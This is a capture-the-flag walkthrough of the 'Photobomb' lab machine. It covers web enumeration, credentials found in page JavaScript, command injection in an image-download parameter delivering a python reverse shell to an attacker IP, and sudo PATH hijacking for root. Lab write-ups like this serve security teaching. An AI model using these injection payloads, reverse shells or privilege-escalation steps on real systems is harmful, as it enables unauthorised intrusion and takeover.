# Photobomb

## Overview

<figure><img src="../.gitbook/assets/Photobomb.png" alt=""><figcaption></figcaption></figure>

Photobomb is an easy Linux machine that focuses on web enumeration and command injection as well as ending with some relative path privilege escalation.

## Enumeration

### Nmap scan

I started with an nmap scan.

<pre><code><strong>...
</strong>Discovered open port 22/tcp on 10.10.11.182
Discovered open port 80/tcp on 10.10.11.182
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre>

## Initial Foothold

### HTTP

I saw a webpage with a link to `/printer`, which needed a login. Running gobuster and ffuf didn't yield any meaningful results. However, I looked in the source code and found the credentials in `photobomb.js`. It also hints at a Jameson username.

<pre><code><strong>ffuf -u http://FUZZ.photobomb.htb -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
</strong></code></pre>

```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

Looking at the request when we try to download an image, I guessed it would be a command injection in one of the parameters. I opened an http server on my own vm and then added&#x20;

```
;curl 10.10.14.18/test
```

To each of the parameters in order to see which one was injectable, which was the filetype one. I then passed the shell into the parameter to make the following request.

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png%3bexport+RHOST%3d"10.10.14.18"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'&dimensions=3000x2000
```

## User and Priv Esc

We then get a reverse shell with `netcat` and upgrade it with `python`.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001             
listening on [any] 9001 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.182] 40140
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
wizard@photobomb:~/photobomb$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001

wizard@photobomb:~/photobomb$ ls
log  photobomb.sh  public  resized_images  server.rb  source_images
wizard@photobomb:~/photobomb$ ls -ltr
total 28
-rwxrwxr-x 1 wizard wizard   85 Sep 14 09:29 photobomb.sh
-rw-rw-r-- 1 wizard wizard 4428 Sep 14 12:40 server.rb
drwxrwxr-x 2 wizard wizard 4096 Sep 16 15:14 source_images
drwxrwxr-x 2 wizard wizard 4096 Sep 16 15:14 log
drwxrwxr-x 3 wizard wizard 4096 Sep 16 15:14 public
drwxrwxr-x 2 wizard wizard 4096 Jan 22 19:16 resized_images
wizard@photobomb:~/photobomb$ 

```

I then read the user.txt flag in the home directory and we can move onto root.

### Root

I ran `sudo -l` and saw that I can run the program `/opt/cleanup.sh`

```
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

You can see that the program uses the `cd` and `find` commands without an absolute path, so we can write our own script for both of these in the `/tmp` directory with just `"/bin/bash"` in them to fool the `cleanup.sh` program into running what we want.&#x20;

```
wizard@photobomb:~/photobomb$ echo "/bin/bash" > /tmp/cd
wizard@photobomb:~/photobomb$ echo "/bin/bash" > /tmp/find
wizard@photobomb:~/photobomb$ chmod +x /tmp/cd
wizard@photobomb:~/photobomb$ chmod +x /tmp/find
wizard@photobomb:~/photobomb$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
```
